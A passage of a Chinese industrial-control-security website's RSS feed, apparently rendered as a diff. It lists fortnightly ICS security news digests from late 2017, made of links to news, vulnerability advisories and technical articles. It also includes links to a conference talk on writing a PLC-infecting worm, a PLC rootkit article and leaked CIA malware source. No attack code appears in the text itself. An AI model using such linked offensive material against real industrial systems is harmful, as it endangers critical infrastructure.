+&lt;p&gt;最后，附上我们在ICS Workshop和DragonCon上演讲的PPT，献给对工控安全感兴趣的你。&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://github.com/w3h/icsmaster/blob/master/doc/%E5%9B%BD%E5%A4%96/Monitoring%20and%20Protecting%20Industrial%20Control%20Systems.pdf"&gt;Monitoring and Protecting ICS&lt;/a&gt;
+&lt;a href="https://github.com/w3h/icsmaster/blob/master/doc/%E5%9B%BD%E5%A4%96/A%20step%20by%20step%20guide%20of%20writing%20a%20worm%20to%20infect%20PLC-based%20systems%20using%20ladder%20logic.pdf"&gt;A step by step guide of writing a worm to infect PLC-based systems using ladder logic&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Dark_Alex</dc:creator><pubDate>Tue, 19 Dec 2017 10:24:00 +0800</pubDate><guid>tag:icsmaster.com,2017-12-19:news/hk_conference.html</guid><category>国际会议</category><category>香港大学</category><category>工控PLC蠕虫</category></item><item><title>工控安全半月报第四期（2017-12 上）</title><link>http://icsmaster.com/news/monthly_report_12_1.html</link><description>&lt;blockquote&gt;
+&lt;p&gt;工匠安全实验室最新版块，专注工控安全的我们，精选近期全球范围内工控安全领域的重要事件，让您及时了解行业发展动态，洞悉行业尖端技术，探寻行业前进方向。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;行业动态&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.aqniu.com/news-views/30187.html"&gt;某能源工厂的安全系统被黑客入侵 造成工厂停止运行&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.aqniu.com/news-views/30080.html"&gt;工控系统/关键基础设施安全年即将到来&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.easyaq.com/news/1678282589.shtml"&gt;军事分析师：朝鲜或会攻击关键基础设施&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/18140"&gt;美国国家标准与技术研究院（NIST） 发布第二版《网络安全框架 草案》&lt;/a&gt;
+短评:NIST 于 2017 年 12 月 5 日发布了”改进关键基础设施网络安全框架“（也就是网络安全框架1.1版草案2）提议更新的第二稿。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465528&amp;amp;ver=579&amp;amp;signature=T041*-7cxy46UatQb-ictrNlJx*hmKDx2205AvEmrQz7bJ8vEhXIlDT6U0xQ-AGHfxnuqrbimN5hgHAJWshvspvF4cjQpix6anSQI1CoptESRCkrQko1Yr2EtT6UfmF5&amp;amp;new=1"&gt;恒泰实达杯全国第三届工控系统信息安全 攻防竞赛圆满闭幕&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465703&amp;amp;ver=579&amp;amp;signature=1htq-798-HZ30bMw5iSUk21E2Ahsd-zYYuywD5J6YNERTDHIqHPQUV6ex8iIp-LWXhrYLg7dPdt0L87eG6MSHtLyYdzZnOgvL3PqbXKs-CUSlzERZnxDuppKgiYA-D*6&amp;amp;new=1"&gt;尹丽波主任谈工业信息安全态势与产业发展&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465895&amp;amp;ver=579&amp;amp;signature=n7ymKA*mQDjgKqWMa6Cc2Q19kc4yycnb9QUgYksyMqEazl41gtx9UwGaD*TbG9DP2N6vRTZwkp5fJz8f1a3B46CaVK8xgCfDd6agXF0vpCFBXpD34ArBgLugLV99jG*S&amp;amp;new=1"&gt;中澳关键基础设施法案对比研究&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465970&amp;amp;ver=579&amp;amp;signature=CuFuS08zETH125RukVaO5kKMNAOqWaDzSDjuJrzb4zT2H1Q6KBVH7Ow-VzIzS57vx1KBfC9u8WppPnBJpj4Cjz7lyXwqydmKKnAM3tDOLFAHfWhPdYLs3Wq*dCV7HbeR&amp;amp;new=1"&gt;与俄罗斯有关联的黑客觊觎土耳其关键基础设施&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465970&amp;amp;ver=579&amp;amp;signature=4IsTSdjtsQU4tPtbTc9t9uv1pvYxi-IQeZbV*zwOTxQNE6KCfvORhvP3whF5Z6nIXv6liNPoLp2EEsm1-q59EaQ*nv3S8HiflGgQqIbZmfpYlJWSM21xDmWeUlQBtBfo&amp;amp;new=1"&gt;卡巴斯基：每天新增30万病毒 基础设施安全像手机一样脆弱&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/QeTtrPGEKE_55E7X6NIDcw"&gt;黑客通过PLC从物理隔离的工业网络中盗取数据&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;技术资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513465418&amp;amp;ver=579&amp;amp;signature=JIVbsiIx5HCrIdL6dCr0rbh-aklwnLE-3AxevhpDB6N6nRmq0RpmTben1Y8EtIduWpDEQAFuz2Eb4*QU*-z9ivpXTQvrt-h9Nb4bxm5-9tqrLhj9-zyzkERavJiqt7*x&amp;amp;new=1"&gt;工控安全预警：CODESYS被曝严重漏洞 影响17款WAGO PLC产品&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513466097&amp;amp;ver=579&amp;amp;signature=GfdToMfoCTZyLi5RldgzZyrPvsA8NeFz6P7LR6gpZ6q7LooEJRvIJW2neRNnHjk54y4*HWki1PohapnlIKxEiJIH9LKdNZkfOPakj-DGd-2*1jPBZiTHQhTadrmcgHPu&amp;amp;new=1"&gt;TRITON病毒可渗透关键基础设施，导致工控系统关机&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.sohu.com/a/208124321_100066938"&gt;ICS安全危机：数千台工业级串口设备服务器被爆泄漏Telnet密码&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/MzLeI17OeDqr2aFBNAidZQ#rd"&gt;中国科学院信息工程研究所 孙利民：对工控系统安全防护的思考与实践&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513466202&amp;amp;ver=579&amp;amp;signature=HPmVSnqlUGo4VvKtc5CBZcg1acbcCzjp81iH0Vuff3BEaVPfMUizfP8zbpVAjzQaEGFAkm9Uc*t3CwdaIVyn*o9xhxss-9VuLM8-t259PNRo6U-ZNw3VSc20jwLtQDuD&amp;amp;new=1"&gt;核电站网络安全：守住黑客攻击的第一道防线&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s?src=11&amp;amp;timestamp=1513466302&amp;amp;ver=579&amp;amp;signature=0P*U6Znbl1QPMGlIU-FNqLiHVs6TwktBI5pN3-K0Sdn7KouqDCQ4QpkIXR1E-8BEAR8AS7zo39AYUVsOlIvF-mM4-FVVEY87WAqNcAsZkEhoP76qgYenexORR0iURZbY&amp;amp;new=1"&gt;工控安全：一场非赢不可的网络战争&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;安全漏洞&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201712-407"&gt;Embedthis GoAhead 安全漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-341-01"&gt;Xiongmai Technology IP Cameras and DVRs&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-341-02"&gt;Rockwell Automation FactoryTalk Alarms and Events&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-341-03"&gt;PHOENIX CONTACT FL COMSERVER, FL COM SERVER, and PSI-MODEM/ETH&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-339-01"&gt;Siemens Industrial Products&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-334-01"&gt;Siemens SWT3000&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-332-01"&gt;Siemens SCALANCE W1750D, M800, and S615&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">chansim</dc:creator><pubDate>Fri, 15 Dec 2017 10:43:00 +0800</pubDate><guid>tag:icsmaster.com,2017-12-15:news/monthly_report_12_1.html</guid><category>news</category></item><item><title>工控安全半月报第三期（2017-11 下）</title><link>http://icsmaster.com/news/monthly_report_11_2.html</link><description>&lt;blockquote&gt;
+&lt;p&gt;工匠安全实验室最新版块，专注工控安全的我们，精选近期全球范围内工控安全领域的重要事件，让您及时了解行业发展动态，洞悉行业尖端技术，探寻行业前进方向。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;行业动态&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/2018-ics-predictions"&gt;2018年工控安全预测 8个方向直击工业控制系统要害&lt;/a&gt;
+短评:恶意软件及恶意工具不断出现、地下黑市提供攻击服务、定向勒索攻击、工业间谍，但犯罪团伙尚未找到攻击工控系统盈利的办法。同时国家规定也在发生变化，工业安全保险日益走热。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/oil-gas-top10-cybersecurity-vuln"&gt;石油天然气十大网络安全漏洞公布 特定的能源行业需要特殊的安全&lt;/a&gt;
+短评:标准的 IT 产品,意味着他们可以被任何人购买，这使攻击者能够了解保护敏感资产的设备的来龙去脉, 更容易利用石油和天然气行业的安全漏洞。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/baplie-hacking"&gt;航运业船图报文BAPLIE系统存安全隐患 黑客有能力弄翻一条船&lt;/a&gt;
+短评:船舶装载和集装箱船图报文系统易受攻击，它们并没有使用安全的邮件系统。有证据表明，过去船舶和终端信息系统，已经被攻击者利用，用于偷运毒品和盗窃贵重物品。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://vip.stock.finance.sina.com.cn/q/go.php/vReport_Show/kind/search/rptid/4002612/index.phtml"&gt;计算机行业:工业互联网加速建设,刺激工控安全需求释放&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.easyaq.com/news/816292307.shtml"&gt;亚太地区：未来十年关键基础设施保护市场增长率最高&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.djbh.net/webdev/web/HomeWebAction.do?p=getXxgg&amp;amp;id=8a8182565fd8b6b9015fecc0764b001e"&gt;澳大利亚发布《关键基础设施安全法案》草案&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/Z6OeRHUfiUyKIV-KG7Eb8w"&gt;刘多：全面加强工业互联网安全能力建设---PPT&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/ynfIKQj18sd1iR5aVwT5jg"&gt;信息网络安全实验室承办“工业控制系统安全防护技术研讨会”顺利召开&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/EKya3TYaAIoQyKosSlNPoA"&gt;中控科技董事长褚健谈化工智能化：工控安全问题不容懈怠&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://nx.cnr.cn/xwzx/xw/20171125/t20171125_524038962.shtml"&gt;全国第四期网络安全创新发展高端论坛举办 会议的主题是“关键信息基础设施保护”&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;技术资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/17481"&gt;美国 ICS-CERT 发布风险预警：Dnsmasq 漏洞仍将影响西门子部分工业设备&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.freebuf.com/news/115005.html"&gt;研究人员开发了一款无法被检测到的工控系统PLC Rootkit&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.freebuf.com/sectool/9794.html"&gt;工控设备扫描工具 – PLCScan&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://blog.nsfocus.net/scada-network-fuzzing-test-protection/"&gt;SCADA网络fuzzing测试及防护&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;安全漏洞&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/sicam-rtu-cve-2017-12737"&gt;西门子6个SICAM RTU产品爆出严重漏洞 可以执行任意代码 &lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSMA-17-332-01"&gt;Ethicon Endo-Surgery Generator G11认证BYPASS&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-35027"&gt;Schneider Electric ClearSCADA内存分配漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-34492"&gt;多款Moxa Nport产品拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-34491"&gt;多款Moxa Nport产品信息泄露漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-34490"&gt;多款Moxa Nport产品拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33869"&gt;SICAM RTU SM-2556 COM模块信息泄露漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33871"&gt;SICAM RTU SM-2556 COM模块任意代码执行漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33870"&gt;SICAM RTU SM-2556 COM模块跨站脚本漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-34216"&gt;Cisco IOS Software拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-34035"&gt;Philips IntelliSpace Cardiovascular System and Xcelera System明文存储漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">chansim</dc:creator><pubDate>Thu, 30 Nov 2017 10:24:00 +0800</pubDate><guid>tag:icsmaster.com,2017-11-30:news/monthly_report_11_2.html</guid><category>news</category></item><item><title>工控安全半月报第二期（2017-11 上）</title><link>http://icsmaster.com/news/monthly_report_11_1.html</link><description>&lt;blockquote&gt;
+&lt;p&gt;工匠安全实验室最新版块，专注工控安全的我们，精选近期全球范围内工控安全领域的重要事件，让您及时了解行业发展动态，洞悉行业尖端技术，探寻行业前进方向。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;行业动态&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/Ey-GiJ9Gx_tgS75LOOmbjA"&gt;中国关键信息基础设施技术创新联盟启航在即 --联盟成立大会预备会在京召开&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/eNhtgWjxHXq_LQevnqs6Iw"&gt;上半年工业自动化系统遭约18000种恶意软件修改&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/16550"&gt;美多家 ISP 经历大范围网络故障：又是“乌龙指”的错？&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/2Iq66QhSR_lvPT1BOkqn2A"&gt;国内外工控安全领域发展态势（国内篇）&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://mp.weixin.qq.com/s/nU7GT1ki3B55QfvXNtapEQ"&gt;一个你不知道的系统悄然成了全世界最流行的操作系统，危险程度堪比核弹！&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/DqK9H_rFrAYCOLAGD0gyBQ"&gt;DHS黑客团队远程入侵了一架波音757&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/16852"&gt;新加坡完善新网络安全法案，保障国家关键基础设施安全&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://t.cn/RjbsSxQ"&gt;一夜回到解放前：田纳西州斯普林希尔遭遇勒索软件攻击&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/nepalese-banks-swift-server-hacked"&gt;黑客攻击尼泊尔中央银行SWIFT系统 440万美金的转账得手58万&lt;/a&gt;
+短评：200多个国家、1.1万多家金融机构在使用SWIFT系统, 每天转移的资金额达数十亿美元。目前，毕马威印度进行数字鉴证审查，SWIFT拒绝就此事置评。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/16818"&gt;外媒：朝鲜黑客疑似加大对美国国防承包商的攻击力度，意在窃取知识产权与军事情报&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://hackernews.cc/archives/16764"&gt;瑞典电台遭黑客入侵，播放30分钟IS宣传歌曲&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/6j-pk54gjXmI3FNOgRfEoQ"&gt;工控安全 | 网信办：迟报、谎报、瞒报和漏报网络安全事件将被追责&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;技术资料&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://icsmaster.com/security/virtual_platform.html"&gt;工业系统虚拟化测试平台搭建&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://www.darkreading.com/threat-intelligence/stealthy-new-plc-hack-jumps-the-air-gap-/d/d-id/1330381"&gt;Stealthy New PLC Hack Jumps the Air Gap&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/K1xNaKZo7Ylrys_A2zoT_Q"&gt;工业控制系统安全调查&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/XyEXyfwFeTpqqpglSg8VJQ"&gt;通过蜜网和钻石模型对ICS威胁进行分析&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/icedid-banking-trojan"&gt;Icedid银行木马攻击美金融机构 使用多项先进技术 有IoC&lt;/a&gt;
+短评：这些技术包括利用Emotet木马传播、反沙箱、web注入、重定向，甚至在仿冒银行网站上显示真实银行的URL及SSL证书。文末附上Icedid银行木马IoC&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://wikileaks.org/vault8/document/repo_hive/"&gt;维基解密曝光新间谍文档 Vault 8：在线公布 CIA 网络武器 Hive 源代码&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://mp.weixin.qq.com/s/UuOpC49p-e6q2qBXTP7MFQ"&gt;入侵检测浅析&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/ordinypt-ransomware"&gt;Ordinypt勒索软件实为清除程序 用随机数据替换文件&lt;/a&gt;
+短评：与NotPetya有些类似目的，实际是破坏计算机，目前主要攻击目标为德国境内公司。但小编没想明白，为啥要伪装成勒索软件？文末附上IoC&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;安全漏洞&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-318-01"&gt;Siemens无线产品KRACK攻击&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSA-17-318-02"&gt;ABB TropOS KRACK攻击&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="https://ics-cert.us-cert.gov/advisories/ICSMA-17-318-01"&gt;Philips IntelliSpace Cardiovascular System and Xcelera System远程溢出&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33793"&gt;ABB Fox515T embedded Web服务器本地文件包含漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33815"&gt;Schneider Electric InduSoft Web Studio和InTouch Machine Edition缓冲区溢出漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-33807"&gt;AutomationDirect多个产品DLL劫持漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32564"&gt;Advantech WebAccess指针引用漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-30707"&gt;Haiwell Cloud SCADA安卓APP存在密码绕过漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32563"&gt;Siemens SIMATIC PCS 7拒绝服务漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32444"&gt;Moxa SoftCMS Live Viewer SQL注入漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32169"&gt;Trihedral Engineering Limited VTScada未授权访问漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32170"&gt;Trihedral Engineering Limited VTScada DLL劫持漏洞&lt;/a&gt; &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://www.cnvd.org.cn/flaw/show/CNVD-2017-32177"&gt;ABB FOX515T信息泄露漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/foscam-c1-ip-video-camera"&gt;福斯康姆Foscam C1网络摄像头再爆9个漏洞 大多是远程代码执行漏洞&lt;/a&gt;
+短评：漏洞涉及攻击点包括web服务DDNS客户端、 CGIProxy.fcgi 固件升级、CGIProxy.fcgi 、devMng Multi-Camera端口、CGIProxy.fcgi注销、UPnP发现等。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/graphicsmagick-hbo-cve-2017-16669"&gt;GraphicsMagick堆缓冲区溢出漏洞CVE-2017-16669 可以远程执行代码&lt;/a&gt;
+短评：成功的攻击可能会让受影响的应用程序崩溃，进而攻击者可能可以实施远程代码执行攻击，但这还没有得到证实。graphicsmagick版1.3.26受影响；其他版本也可能受到影响。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/webaccess-cve-2017-12719"&gt;研华Advantech修复WebAccess两个远程代码执行漏洞 8月的漏洞11月才修复&lt;/a&gt;
+短评：分别是WebAccess 缓冲区溢出漏洞 (CVE-2017-14016) 和未受信指针取消引用漏洞 (CVE-2017-12719) ，WebAccess 8.2_20170817 之前版本受到影响。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href="http://toutiao.secjia.com/cisco-products-rci-cve-2017-12277"&gt;思科多产品爆出远程命令注入漏洞CVE-2017-12277 可以执行任意命令&lt;/a&gt;
+短评：攻击者可以利用此问题，在受影响的应用程序的上下文中插入和执行任意命令，这可能有助于进一步的攻击。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">chansim</dc:creator><pubDate>Wed, 15 Nov 2017 10:43:00 +0800</pubDate><guid>tag:icsmaster.com,2017-11-15:news/monthly_report_11_1.html</guid><category>news</category></item><item><title>工业系统虚拟化测试平台搭建</title><link>http://icsmaster.com/security/virtual_platform.html</link><description>&lt;h2&gt;一、系统概述&lt;/h2&gt;
+&lt;p&gt;基于虚拟化技术搭建的工业自动化测试平台。多个品牌多套控制系统有机融合在一个虚拟化环境里。对最终的客户或学院屏蔽底层细节。模拟真实的Engineer和Operation 工作站环境。从以太网端口镜像可以截取真实的报文。&lt;/p&gt;
+&lt;h2&gt;二、工业自动化虚拟测试平台&lt;/h2&gt;
+&lt;h3&gt;1. 目前暂时未完全实现虚拟化的系统&lt;/h3&gt;
+&lt;h4&gt;施耐德-福克斯波罗  I/A  DCS和Evo DCS系统&lt;/h4&gt;
